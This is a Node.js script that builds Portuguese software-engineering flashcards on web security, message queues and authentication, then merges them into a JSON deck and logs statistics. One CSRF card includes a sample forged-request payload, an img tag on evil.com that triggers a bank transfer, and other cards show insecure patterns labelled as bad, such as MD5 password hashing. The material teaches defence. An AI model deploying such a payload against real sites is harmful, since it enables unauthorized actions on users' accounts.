    ["CORS controla quais origens podem acessar recursos de outro domínio; browsers bloqueiam por padrão para prevenir ataques", "CORS é um tipo de criptografia", "Browsers nunca bloqueiam requisições", "CORS só afeta WebSockets"],
    0,
    "Same-Origin Policy impede que scripts em um domínio acessem dados de outro (ex: evil.com não pode ler dados de bank.com). CORS (Cross-Origin Resource Sharing) é o mecanismo que permite exceções controladas via headers HTTP. O servidor define quais origens, métodos e headers são permitidos. Preflight requests (OPTIONS) verificam permissões antes de enviar a requisição real.",
    "API em api.meusapp.com, frontend em app.meusapp.com:\nAccess-Control-Allow-Origin: https://app.meusapp.com\nAccess-Control-Allow-Methods: GET, POST, PUT\nAccess-Control-Allow-Headers: Authorization\n\n❌ NUNCA use Access-Control-Allow-Origin: * com cookies/auth!"
  ),
  card("Segurança no Desenvolvimento", "Médio", 2,
    ["security", "dependency-vulnerabilities", "supply-chain"],
    "Como proteger sua aplicação contra vulnerabilidades em dependências (supply chain)?",
    ["Scan automático (Dependabot, Snyk), fixar versões, auditar regularmente, usar lockfiles, mínimo de dependências", "Ignorar avisos de vulnerabilidade", "Usar sempre a versão latest", "Dependências são sempre seguras"],
    0,
    "Ataques de supply chain exploram vulnerabilidades em pacotes terceiros. Proteção: 1) Scan automático (Dependabot, Snyk, npm audit). 2) Fixar versões no lockfile (package-lock.json). 3) Revisar antes de adicionar nova dependência (popularidade, manutenção, licença). 4) Atualizar regularmente. 5) Mínimo de dependências. 6) Verificar typosquatting (lodash vs 1odash).",
    "npm audit → lista vulnerabilidades conhecidas.\nnpm audit fix → atualiza para versões corrigidas.\nGitHub Dependabot: abre PRs automáticos quando descobre CVE.\nSnyk: scan contínuo no CI/CD, bloqueia merge se encontrar high/critical."
  ),
  card("Segurança no Desenvolvimento", "Médio", 3,
    ["security", "input-validation", "sanitization"],
    "Qual a diferença entre validação e sanitização de input e onde aplicar cada uma?",
    ["Validação verifica se input atende critérios (formato, tipo); sanitização limpa/transforma input para remover conteúdo perigoso. Validar no backend sempre", "Validação no frontend é suficiente", "Sanitização substitui validação", "São a mesma coisa"],
    0,
    "Validação verifica se o input é aceitável (tipo, formato, tamanho, range): rejeita dados inválidos. Sanitização transforma o input para torná-lo seguro (escapar caracteres especiais, remover tags HTML). Regra: validar no frontend (UX) E no backend (segurança — frontend pode ser bypassed). Sanitizar output ao renderizar (previne XSS). Usar allowlists > denylists.",
    "Email: validar formato (regex) + sanitizar (trim, lowercase). HTML comment: sanitizar com DOMPurify ou similar (remove <script>). Número: validar parseInt/isNaN + range check. NUNCA confiar em validação client-side apenas — atacante pode enviar requisição direta à API."
  ),
  // Difícil (3)
  card("Segurança no Desenvolvimento", "Difícil", 1,
    ["security", "csrf", "token"],
    "O que é CSRF (Cross-Site Request Forgery) e como prevenir?",
    ["Ataque que força o browser do usuário autenticado a fazer requisições indesejadas; prevenir com CSRF tokens, SameSite cookies", "É o mesmo que XSS", "Só afeta APIs REST", "Não existe em apps modernos"],
    0,
    "CSRF engana o browser de um usuário logado para executar ações não intencionais (ex: transferir dinheiro). Funciona porque o browser envia cookies automaticamente. Prevenção: 1) CSRF token (token único por sessão/formulário, verificado no server). 2) SameSite=Strict/Lax nos cookies. 3) Verificar header Origin/Referer. 4) Exigir re-autenticação para ações críticas.",
    "Ataque: Usuário logado no banco acessa evil.com → evil.com tem <img src='banco.com/transfer?to=hacker&amount=1000'> → browser envia cookie do banco → transferência executada!\nPrevenção: <input type='hidden' name='_csrf' value='token-único'> → servidor verifica token."
  ),
  card("Segurança no Desenvolvimento", "Difícil", 2,
    ["security", "hashing", "bcrypt"],
    "Como armazenar senhas de forma segura e por que hashing ≠ criptografia?",
    ["Usar hash com salt (bcrypt/argon2) — unidirecional; criptografia é bidirecional e inadequada para senhas", "Criptografar com AES é suficiente", "Armazenar em base64", "MD5 é seguro para senhas"],
    0,
    "Hashing é unidirecional (não pode reverter), criptografia é bidirecional (pode decriptar). Senhas devem ser hasheadas, não criptografadas (se a chave vazar, todas as senhas são expostas). Usar algoritmos lentos por design: bcrypt, scrypt ou Argon2id. Sempre adicionar salt (valor aleatório por senha) para prevenir rainbow tables. NUNCA usar MD5 ou SHA-256 puro para senhas (rápidos demais = fácil de brute force).",
    "// ✅ Seguro: bcrypt com salt automático\nconst hash = await bcrypt.hash(senha, 12); // 12 rounds\nawait bcrypt.compare(inputSenha, hashSalvo); // Verifica\n\n// ❌ Inseguro:\ncrypto.createHash('md5').update(senha).digest('hex');\n// MD5: bilhões de hashes/segundo = quebra em minutos"
  ),
  card("Segurança no Desenvolvimento", "Difícil", 3,
    ["security", "rate-limiting", "ddos"],
    "Como proteger aplicações contra ataques de força bruta e DDoS na camada de aplicação?",
    ["Rate limiting por IP/user, CAPTCHA progressivo, WAF, exponential backoff em tentativas falhas, CDN com proteção DDoS", "Bloquear país inteiro", "Aumentar capacidade do servidor apenas", "Não é responsabilidade do dev"],
    0,
    "Proteção em camadas: 1) Rate limiting (max requests por IP/user por período). 2) Account lockout com exponential backoff (1s, 2s, 4s, 8s após falhas). 3) CAPTCHA após N tentativas falhas. 4) WAF (Web Application Firewall) para filtrar padrões maliciosos. 5) CDN com proteção DDoS (Cloudflare, AWS Shield). 6) Monitoramento e alertas para padrões anômalos. Combinar múltiplas camadas — nenhuma é suficiente sozinha.",
    "Login: 5 tentativas → CAPTCHA → 10 tentativas → lockout 15min → alerta ao admin. API: 100 req/min por API key (Token Bucket). Nginx: limit_req zone=api rate=10r/s burst=20. Cloudflare: bloqueia IPs com >1000 req/min. Monitoramento: alerta se error rate > 5%."
  ),

  // ======================== MENSAGERIA E FILAS (10) ========================
  // Fácil (4)
  card("Mensageria e Filas", "Fácil", 1,
    ["messaging", "queue", "async"],
    "O que é mensageria e por que usar filas de mensagens?",
    ["Comunicação assíncrona entre serviços via intermediário (broker); desacopla produtores e consumidores, absorve picos", "É envio de emails", "É comunicação síncrona", "Substitui API REST completamente"],
    0,
    "Mensageria é um padrão onde serviços se comunicam através de um intermediário (message broker) em vez de chamadas diretas. O produtor envia mensagem para uma fila/tópico; o consumidor processa quando estiver pronto. Benefícios: desacoplamento (serviços independentes), buffer de picos, retry automático, processamento assíncrono, escalabilidade independente.",
    "Sem fila: API → processamento → resposta (se demorar 30s, timeout). Com fila: API → mensagem na fila → resposta imediata (202 Accepted) → worker processa em background. Exemplos: envio de email, geração de relatório, processamento de pagamento."
  ),
  card("Mensageria e Filas", "Fácil", 2,
    ["messaging", "pub-sub", "pattern"],
    "Qual a diferença entre o padrão Queue (fila) e Pub/Sub (publicação/assinatura)?",
    ["Queue: cada mensagem é consumida por um único consumer; Pub/Sub: mensagem é entregue a todos os subscribers", "São iguais", "Pub/Sub garante entrega a apenas um", "Queue envia para todos"],
    0,
    "Queue (Point-to-Point): mensagem é processada por exatamente um consumidor. Se há múltiplos consumers, eles competem pela mensagem (load balancing). Pub/Sub (Publish/Subscribe): mensagem publicada num tópico é entregue a todos os subscribers inscritos naquele tópico (fanout). Cada subscriber recebe uma cópia independente.",
    "Queue: Pedido → fila 'processar-pedido' → 1 dos 3 workers processa (load balanced).\nPub/Sub: Pedido criado → tópico 'pedido-criado' → ServiçoEmail recebe + ServiçoEstoque recebe + ServiçoAnalytics recebe. Cada um processa independentemente."
  ),
  card("Mensageria e Filas", "Fácil", 3,
    ["messaging", "rabbitmq", "broker"],
    "O que é RabbitMQ e quando é uma boa escolha?",
    ["Message broker que implementa AMQP com filas, exchanges e roteamento flexível; ideal para comunicação entre microserviços", "É um banco de dados", "É um load balancer", "Só funciona com Java"],
    0,
    "RabbitMQ é um message broker open-source que implementa o protocolo AMQP. Suporta múltiplos padrões: filas simples, pub/sub, roteamento por tópico, RPC. Garante entrega com acknowledgements e persistência. Ideal para: comunicação entre microserviços, task queues, workloads com volume moderado. Mais simples que Kafka para casos de uso tradicionais.",
    "Producer → Exchange (roteador) → Queue → Consumer. Exchange types: direct (roteamento exato), fanout (broadcast), topic (padrão com wildcards). Exemplo: exchange 'orders' tipo topic → routing key 'order.created' → queues inscritas em 'order.*' recebem."
  ),
  card("Mensageria e Filas", "Fácil", 4,
    ["messaging", "use-cases", "async-processing"],
    "Quais são os casos de uso mais comuns para filas de mensagens?",
    ["Processamento em background (email, relatório), comunicação entre microserviços, absorção de picos, retry de operações", "Apenas envio de notificações", "Substituir banco de dados", "Renderizar páginas web"],
    0,
    "Casos de uso principais: 1) Processamento em background (envio de email, geração de PDF, resize de imagem). 2) Comunicação entre microserviços (evento publicação). 3) Absorção de picos (Black Friday: fila acumula pedidos, workers processam no ritmo possível). 4) Retry automático (consumidor falha → mensagem volta pra fila). 5) Agendamento de tarefas (delayed messages).",
    "E-commerce na Black Friday: 10.000 pedidos/min → API aceita e coloca na fila → 100 workers processam no ritmo de 1.000/min → fila absorve o pico. Sem fila: API fica sobrecarregada → timeouts → perda de vendas."
  ),
  // Médio (3)
  card("Mensageria e Filas", "Médio", 1,
    ["messaging", "kafka", "event-streaming"],
    "O que diferencia Apache Kafka de message brokers tradicionais como RabbitMQ?",
    ["Kafka é uma plataforma de event streaming com log persistente e ordenado, otimizada para alto throughput; brokers tradicionais focam em roteamento flexível de mensagens", "Kafka é mais simples que RabbitMQ", "São equivalentes", "Kafka não persiste mensagens"],
    0,
    "Kafka é um log distribuído e imutável: mensagens ficam no tópico por tempo configurável (dias/semanas), não são removidas ao serem consumidas. Múltiplos consumers leem a mesma mensagem. Otimizado para alto throughput (milhões de msgs/s). RabbitMQ: mensagem é removida após processada, roteamento mais flexível, melhor para workloads tradicionais. Kafka brilha em: event sourcing, streaming, analytics em tempo real.",
    "Kafka: tópico 'clickstream' com 30 partições → 3 consumer groups leem TODOS os eventos independentemente: analytics, ML, alarmes. Mensagens ficam 7 dias. Throughput: 1M msgs/s. RabbitMQ: mensagem processada por 1 consumer → removida. Throughput: ~50K msgs/s."
  ),
  card("Mensageria e Filas", "Médio", 2,
    ["messaging", "delivery-guarantees", "idempotency"],
    "Quais são as garantias de entrega em mensageria e por que idempotência é importante?",
    ["At-most-once (pode perder), At-least-once (pode duplicar), Exactly-once (mais difícil); idempotência trata duplicatas", "Mensagens nunca são perdidas ou duplicadas", "Exact-once é trivial de implementar", "Garantias não importam na prática"],
    0,
    "At-most-once: dispara e esquece, pode perder mensagem. At-least-once: reentrega até confirmar, pode duplicar. Exactly-once: a mais difícil, requer transações entre broker e consumidor (Kafka Transactions). Na prática, maioria usa at-least-once + idempotência: consumidor detecta e ignora duplicatas (via ID único da mensagem).",
    "At-least-once: Pagamento processado → consumer crash antes do ack → broker reenvia → pagamento processado 2x! Solução: idempotency key. Cada mensagem tem ID único. Consumer verifica: 'já processei msg-123?' Sim → ignora. Não → processa e salva ID."
  ),
  card("Mensageria e Filas", "Médio", 3,
    ["messaging", "dead-letter-queue", "error-handling"],
    "O que é uma Dead Letter Queue (DLQ) e por que é essencial?",
    ["Fila que recebe mensagens que falharam repetidamente após máximo de retries, permitindo análise e reprocessamento manual", "É uma fila para mensagens deletadas", "É um tipo de backup do banco", "DLQ é obrigatória em toda fila"],
    0,
    "Dead Letter Queue recebe mensagens que falharam após o número máximo de tentativas de processamento. Sem DLQ, mensagens problemáticas ficam em loop infinito de retry, bloqueando outras mensagens. Com DLQ: mensagem vai para fila separada para análise, alertas são disparados, e o time pode investigar e reprocessar manualmente. Mensagens na DLQ geralmente indicam bugs ou dados inesperados.",
    "Fila 'processar-pedido': max 3 retries → falha → move para DLQ 'processar-pedido-dlq'. Alerta no Slack: '5 mensagens na DLQ nas últimas 2h'. Dev investiga: JSON malformado de parceiro → corrige parser → reprocessa mensagens da DLQ."
  ),
  // Difícil (3)
  card("Mensageria e Filas", "Difícil", 1,
    ["messaging", "kafka-partitions", "ordering"],
    "Como Kafka garante ordenação de mensagens e qual o papel das partições?",
    ["Kafka garante ordem apenas dentro de uma partição; partition key agrupa mensagens relacionadas na mesma partição", "Kafka garante ordem global", "Partições não afetam ordem", "Ordem é aleatória por design"],
    0,
    "Kafka garante ordenação APENAS dentro de uma partição (offset sequencial). Um tópico tem N partições para paralelismo. A partition key (ex: user_id) determina em qual partição vai a mensagem (hash da key). Mensagens com mesma key sempre vão para a mesma partição → ordem garantida. Cada partição é consumida por exatamente um consumer do grupo.",
    "Tópico 'orders' com 3 partições. Partition key = order_id. Eventos do pedido #123: Created → Paid → Shipped → todos na mesma partição (hash(123) % 3 = partição 1). Ordem garantida: sempre Created antes de Paid antes de Shipped. Diferentes pedidos podem estar em partições diferentes."
  ),
  card("Mensageria e Filas", "Difícil", 2,
    ["messaging", "saga-pattern", "distributed-transactions"],
    "O que é o padrão Saga e como ele gerencia transações distribuídas com filas?",
    ["Sequência de transações locais coordenadas por eventos ou orquestrador; cada passo tem compensação para rollback", "É uma transação ACID distribuída", "É o mesmo que two-phase commit", "Só funciona com RabbitMQ"],
    0,
    "Saga gerencia transações que span múltiplos microserviços sem lock distribuído. Cada serviço executa sua transação local e publica evento. Se um passo falha, executa compensating transactions (rollbacks dos passos anteriores). Dois estilos: Choreography (eventos entre serviços, descentralizado) e Orchestration (orquestrador central coordena passos).",
    "Saga de Pedido (Orchestration):\n1. OrderService: Criar pedido → ✅\n2. PaymentService: Cobrar cartão → ✅\n3. StockService: Reservar estoque → ❌ (sem estoque)\nCompensação: PaymentService estorna → OrderService cancela pedido.\nOrquestrador coordena toda a sequência e compensações."
  ),
  card("Mensageria e Filas", "Difícil", 3,
    ["messaging", "backpressure", "flow-control"],
    "O que é backpressure em sistemas de mensageria e como lidar com isso?",
    ["Mecanismo de controle de fluxo quando o consumidor não consegue acompanhar a taxa do produtor; soluções: scaling, rate limiting, buffering", "É quando a fila está vazia", "Backpressure não existe com brokers", "Basta aumentar o tamanho da fila infinitamente"],
    0,
    "Backpressure ocorre quando produtores enviam mensagens mais rápido do que consumidores processam. Sem tratamento: filas crescem indefinidamente → estoura memória/disco → perda de dados. Estratégias: 1) Auto-scaling de consumers. 2) Rate limiting no produtor. 3) Particionamento para paralelismo. 4) Priorização de mensagens. 5) Drop de mensagens não-críticas. 6) Alertas por tamanho de fila/lag.",
    "Kafka Consumer Group com lag crescendo: consumer lag = 1M mensagens. Soluções: 1) Adicionar consumers (até nº de partições). 2) Aumentar partições do tópico. 3) Otimizar processamento no consumer. 4) Batch processing. Monitoramento: alerta se lag > 100K por 5 min."
  ),

  // ======================== AUTENTICAÇÃO E AUTORIZAÇÃO (10) ========================
  // Fácil (4)
  card("Autenticação e Autorização", "Fácil", 1,
    ["auth", "authentication", "authorization"],
    "Qual a diferença entre autenticação e autorização?",
    ["Autenticação verifica quem você é (identidade); autorização verifica o que você pode fazer (permissões)", "São a mesma coisa", "Autenticação vem depois da autorização", "Autorização verifica a identidade"],
    0,
    "Autenticação (AuthN) = verificar identidade: 'Quem é você?' (login, biometria, 2FA). Autorização (AuthZ) = verificar permissões: 'O que você pode fazer?' (admin pode deletar, user pode apenas ler). Primeiro autentica, depois autoriza. Exemplo: crachá de empresa = autenticação; cargo/setor = autorização para entrar em certas salas.",
    "1. Autenticação: usuário faz login com email+senha → servidor verifica → emite JWT. 2. Autorização: usuário tenta DELETE /api/users/5 → middleware verifica: JWT válido (autenticado ✅) + role=admin? (autorizado ❌ se role=user) → 403 Forbidden."
  ),
  card("Autenticação e Autorização", "Fácil", 2,
    ["auth", "jwt", "token"],
    "O que é JWT (JSON Web Token) e como funciona?",
    ["Token autocontido com header, payload e signature que carrega claims do usuário e é verificável sem consultar banco", "É um tipo de cookie", "É uma sessão server-side", "JWT é criptografado por padrão"],
    0,
    "JWT é um token compacto com 3 partes (separadas por '.'): Header (algoritmo), Payload (claims: userId, role, exp) e Signature (garante integridade). O servidor gera o JWT no login e o cliente envia via header Authorization: Bearer <token>. O servidor valida a signature sem consultar banco. JWT é assinado (não pode ser adulterado), mas NÃO criptografado — payload é visível em base64.",
    "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjQyLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDk3NTk0MDB9.signature\n\nPayload decodificado: {\"userId\": 42, \"role\": \"admin\", \"exp\": 1709759400}\n⚠️ Qualquer um pode ler o payload! Não colocar dados sensíveis."
  ),
  card("Autenticação e Autorização", "Fácil", 3,
    ["auth", "mfa", "2fa"],
    "O que é autenticação multifator (MFA/2FA) e por que é importante?",
    ["Exige 2+ fatores de categorias diferentes (algo que sabe + algo que tem + algo que é) para verificar identidade", "É usar 2 senhas diferentes", "É biometria apenas", "MFA elimina a necessidade de senha"],
    0,
    "MFA requer múltiplos fatores de categorias diferentes: 1) Algo que você sabe (senha, PIN). 2) Algo que você tem (celular, YubiKey, TOTP app). 3) Algo que você é (biometria: impressão digital, face). Mesmo que a senha vaze, o atacante precisa do segundo fator. TOTP (Google Authenticator) gera códigos temporários de 6 dígitos que mudam a cada 30 segundos.",
    "Login com 2FA: 1) Email + senha (fator: algo que sabe) → OK. 2) App Authenticator gera código 847291 (fator: algo que tem) → verifica → Login aprovado. Sem o celular, mesmo com a senha, o atacante não consegue entrar."
  ),
  card("Autenticação e Autorização", "Fácil", 4,
    ["auth", "session", "cookie"],
    "Qual a diferença entre autenticação baseada em sessão e baseada em token?",
    ["Sessão: estado no servidor (session store); Token (JWT): estado no cliente (stateless no servidor)", "São idênticas", "Tokens são mais seguros sempre", "Sessões não usam cookies"],
    0,
    "Sessão: servidor cria session ID, armazena dados na memória/banco, envia ID via cookie ao cliente. A cada request, servidor busca dados da sessão. Stateful. Token (JWT): servidor gera token assinado com dados do usuário, cliente armazena e envia a cada request. Servidor valida signature sem armazenar estado. Stateless. Sessão: ideal para apps web tradicionais. JWT: ideal para APIs e mobile.",
    "Sessão: Cookie: session_id=abc123 → Servidor busca em Redis: {user: 42, role: admin}. Escalabilidade requer session store compartilhado.\nJWT: Header: Bearer eyJ... → Servidor valida signature, lê payload direto. Stateless — qualquer instância pode validar."
  ),
  // Médio (3)
  card("Autenticação e Autorização", "Médio", 1,
    ["auth", "oauth2", "social-login"],
    "O que é OAuth 2.0 e qual a diferença entre seus fluxos (Authorization Code, Client Credentials)?",
    ["Protocolo de autorização delegada; Authorization Code: para apps com backend; Client Credentials: para comunicação server-to-server", "OAuth é um protocolo de autenticação", "Só existe um fluxo OAuth", "OAuth substitui JWT"],
    0,
    "OAuth 2.0 permite que um app acesse recursos de outro em nome do usuário sem expor credenciais. Authorization Code Flow (apps com backend): redirect → login no provider → code → troca por token no backend (mais seguro). Client Credentials: server-to-server sem usuário. Implicit Flow (deprecated): token direto na URL. PKCE: versão segura para SPAs e mobile.",
    "Login com Google (Authorization Code + PKCE):\n1. App redireciona → accounts.google.com/login\n2. Usuário loga no Google → redirect com code\n3. Backend troca code por access_token (com PKCE verifier)\n4. Backend usa access_token para buscar perfil do Google\n5. Cria sessão/JWT próprio para o usuário"
  ),
  card("Autenticação e Autorização", "Médio", 2,
    ["auth", "rbac", "permissions"],
    "O que é RBAC (Role-Based Access Control) e como implementar?",
    ["Atribui permissões a roles (papéis) e roles a usuários; simplifica gerenciamento de autorização em escala", "É o mesmo que autenticação", "Cada permissão é atribuída diretamente a cada usuário", "RBAC não escala para muitos usuários"],
    0,
    "RBAC mapeia: Usuário → Role(s) → Permissão(ões). Em vez de atribuir permissões individualmente a cada usuário, atribui-se roles. Exemplo de roles: admin, editor, viewer. Admin herda todas as permissões de editor e viewer. Implementação: tabelas user_roles e role_permissions, middleware verifica role no JWT/sessão. Alternativa: ABAC (Attribute-Based) para regras mais complexas.",
    "Roles: viewer (ler), editor (ler + criar + editar), admin (tudo). User 'Ana' tem role 'editor'. Middleware: if (!user.roles.includes('admin')) return 403; // Ana não pode deletar. Novo funcionário? Atribui role 'editor' → ganha todas as permissões do role automaticamente."
  ),
  card("Autenticação e Autorização", "Médio", 3,
    ["auth", "refresh-token", "token-rotation"],
    "O que são Refresh Tokens e por que usar tokens de curta duração + refresh?",
    ["Access token expira rápido (~15min) limitando janela de ataque; refresh token de longa duração renova o access token sem re-login", "Usar access token que nunca expira", "Refresh token é o mesmo que access token", "Tokens de curta duração são ruins para UX"],
    0,
    "Access tokens curtos (~15 min) limitam o dano se forem roubados. Refresh tokens (dias/semanas) ficam armazenados com segurança e são usados para obter novos access tokens sem re-login. Refresh token rotation: cada uso gera um novo refresh token e invalida o anterior — se um refresh token for roubado e usado, o token legítimo é invalidado e detecta-se a brecha.",
    "Login → access_token (15min) + refresh_token (7 dias)\nAPI call: Authorization: Bearer <access_token>\nAccess expirou → POST /auth/refresh {refresh_token} → novo access_token + novo refresh_token (rotation)\nRefresh expirou → re-login necessário\nRefresh roubado e usado? → Invalida toda a família de tokens!"
  ),
  // Difícil (3)
  card("Autenticação e Autorização", "Difícil", 1,
    ["auth", "openid-connect", "identity"],
    "Qual a diferença entre OAuth 2.0 e OpenID Connect (OIDC)?",
    ["OAuth 2.0 é para autorização (acesso a recursos); OIDC adiciona camada de autenticação (identidade do usuário) sobre OAuth 2.0", "São protocolos completamente separados", "OIDC substitui OAuth 2.0", "OAuth 2.0 já faz autenticação"],
    0,
    "OAuth 2.0 é um framework de autorização: 'pode este app acessar seus dados?' — mas não define identidade do usuário. OpenID Connect (OIDC) é uma camada sobre OAuth 2.0 que adiciona autenticação: retorna um ID Token (JWT) com claims de identidade (sub, email, name). OIDC define endpoints padrão (userinfo, discovery) e escopos (openid, profile, email).",
    "OAuth 2.0 puro: app recebe access_token → pode acessar Google Drive do usuário. Mas quem é o usuário? Não sabe.\nOIDC: app recebe access_token + id_token → id_token tem: {sub: '123', email: 'ana@ex.com', name: 'Ana'}. Agora sabe quem é o usuário."
  ),
  card("Autenticação e Autorização", "Difícil", 2,
    ["auth", "zero-trust", "security-model"],
    "O que é o modelo Zero Trust e como ele afeta autenticação e autorização?",
    ["Nunca confie, sempre verifique — toda requisição é autenticada e autorizada independente da origem, mesmo dentro da rede interna", "Confiar em tudo dentro da rede corporativa", "É apenas usar VPN", "Zero Trust elimina a necessidade de firewall"],
    0,
    "Zero Trust elimina o conceito de 'rede confiável'. Princípios: 1) Verificar explicitamente (autenticação em toda requisição). 2) Menor privilégio (mínimo de permissões necessárias). 3) Assumir brecha (monitorar e limitar blast radius). Implementação: mTLS entre serviços, identidade para tudo (usuários, serviços, dispositivos), micro-segmentação de rede, continuous verification.",
    "Modelo tradicional: dentro da VPN = confiável → atacante que entra tem acesso a tudo.\nZero Trust: cada microserviço autentica com mTLS + verifica token → lateral movement bloqueado. Google BeyondCorp: eliminou VPN, todo acesso verificado por identidade + contexto (dispositivo, localização, horário)."
  ),
  card("Autenticação e Autorização", "Difícil", 3,
    ["auth", "api-security", "token-storage"],
    "Quais são as melhores práticas para armazenar tokens de autenticação no frontend?",
    ["HttpOnly cookies para web (protege contra XSS); Secure Storage para mobile; nunca em localStorage para tokens sensíveis", "localStorage é a melhor opção", "Armazenar no código-fonte", "Cookies sem flags de segurança"],
    0,
    "Web: HttpOnly + Secure + SameSite cookies são o mais seguro (inacessíveis a JavaScript, protege contra XSS). localStorage é vulnerável a XSS (qualquer script pode ler). Se usar JWT em memória (variável JS), protege contra XSS mas perde na recarga. Mobile: Keychain (iOS) / Keystore (Android) — encrypted storage do OS. Nunca: localStorage para refresh tokens, cookies sem Secure/HttpOnly, armazenar em sessionStorage assumindo segurança.",
    "// ✅ Web: cookie HttpOnly (servidor seteia)\nSet-Cookie: token=jwt123; HttpOnly; Secure; SameSite=Strict; Path=/\n// JS não consegue ler → XSS não rouba o token\n\n// ❌ Vulnerável:\nlocalStorage.setItem('token', jwt); // Qualquer script XSS lê isso\n\n// ✅ Mobile React Native: expo-secure-store\nawait SecureStore.setItemAsync('token', jwt);"
  ),
];

const merged = [...data, ...newCards];
fs.writeFileSync(jsonPath, JSON.stringify(merged, null, 2), "utf-8");
console.log(`✅ Adicionados ${newCards.length} cards em ${[...new Set(newCards.map(c => c.category))].length} categorias`);
console.log(`Total de cards em engenharia-de-software: ${merged.length}`);

const cats = [...new Set(newCards.map(c => c.category))];
cats.forEach(c => {
  const count = newCards.filter(x => x.category === c).length;
  const diffs = {};
  newCards.filter(x => x.category === c).forEach(x => { diffs[x.difficulty] = (diffs[x.difficulty]||0)+1; });
  console.log(`  ${c}: ${count} cards — ${JSON.stringify(diffs)}`);
});

const ids = merged.map(c => c.id);
const dupes = ids.filter((id, i) => ids.indexOf(id) !== i);
console.log('\nIDs duplicados:', dupes.length === 0 ? 'Nenhum ✅' : dupes);
